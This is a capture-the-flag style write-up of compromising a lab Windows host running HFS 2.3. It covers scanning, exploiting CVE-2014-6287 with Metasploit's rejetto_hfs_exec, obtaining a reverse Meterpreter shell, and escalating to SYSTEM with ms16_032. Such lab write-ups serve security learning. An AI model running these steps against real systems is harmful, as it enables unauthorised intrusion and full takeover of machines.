##nmap result

```
80/tcp open  http    syn-ack HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windo
```

By doing a google search of `HttpFileServer ver 2.3` we see that it has vulnerabilities `CVE-2014-6287`, by using this exploit (https://github.com/thepedroalves/HFS-2.3-RCE-Exploit)
it exploits the findMacroMarker function in parseLib.pas due to a poor regex. it wont handle a null byte and allowing us to inject code.

We can also use `msfconsole` and use the module `windows/http/rejetto_hfs_exec`

Then we need to supply the required information.

```
   Name       Current Setting  Required  Description                                                                                                                                          
   ----       ---------------  --------  -----------                                                                                                                                          
   HTTPDELAY  10               no        Seconds to wait before terminating web server                                                                                                        
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                                                                                         
   RHOSTS     10.10.10.8       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                                               
   RPORT      80               yes       The target port (TCP)                                                                                                                                
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.                
   SRVPORT    8080             yes       The local port to listen on.                                                                                                                         
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                                                                                           
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)                                                                                     
   TARGETURI  /?search=%00     yes       The path of the web application                                                                                                                      
   URIPATH                     no        The URI to use for this exploit (default is random)                                                                                                  
   VHOST                       no        HTTP server virtual host
```

Once we run the module, we should receive a shell

```
msf](Jobs:0 Agents:0) exploit(windows/http/rejetto_hfs_exec) >> run                                                                                                                          
                                                                                                                                                                                              
[*] Started reverse TCP handler on 10.10.14.83:9002                                                                                                                                           
[*] Using URL: http://10.10.14.83:8080/atU6IVvEh2jbGv                                                                                                                                         
[*] Server started.                                                                                                                                                                           
[*] Sending a malicious request to /                                                                                                                                                          
[*] Payload request received: /atU6IVvEh2jbGv                                                                                                                                                 
[*] Sending stage (175686 bytes) to 10.10.10.8                                                                                                                                                
[!] Tried to delete %TEMP%\EVNIQRumJY.vbs, unknown result                                                                                                                                     
[*] Meterpreter session 1 opened (10.10.14.83:9002 -> 10.10.10.8:49250) at 2023-11-13 13:21:38 -0600                                                                                          
[*] Server stopped.                                                                                                                                                                           
                                                                                                                                                                                              
(Meterpreter 1)(C:\Users\kostas\Desktop) >
```

Once a succesful session is created, we will then put the session in background, using `background` command, we then use another module called `post/multi/recon/local_exploit_suggested`
We will supply the previous `session` and run the module, this will check for possible exploit in the current session.

After running the exploit suggester, we get a long list but there are only 2 that is a potentially vulnerable.

```
#   Name                                                           Potentially Vulnerable?  Check Result                                                                                     
 -   ----                                                           -----------------------  ------------                                                                                     
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                                             
 2   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.  
```

Testing the `bypassuac_eventvr`, does not work as our current user logged in is not an admin

```
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> run

[*] Started reverse TCP handler on 10.10.14.83:4444 
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
```

Testing the `ms16_032_secondary_logon_handle_privesc` works!
(This module exploits the lack of sanitization of standard handles in Windows secondary logon service, this affects version of Windows 7-10, 2k8-2k12 32 and 64 bit and this only works against those version of Windows with Powershell 2.0 and later with two or more CPU cores.)

Again by the supplying the session that was created the first time and running the module. We got a shell and as `nt authority\system`

```
Meterpreter 2)(C:\Users\kostas\Desktop) > shell
Process 2908 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```
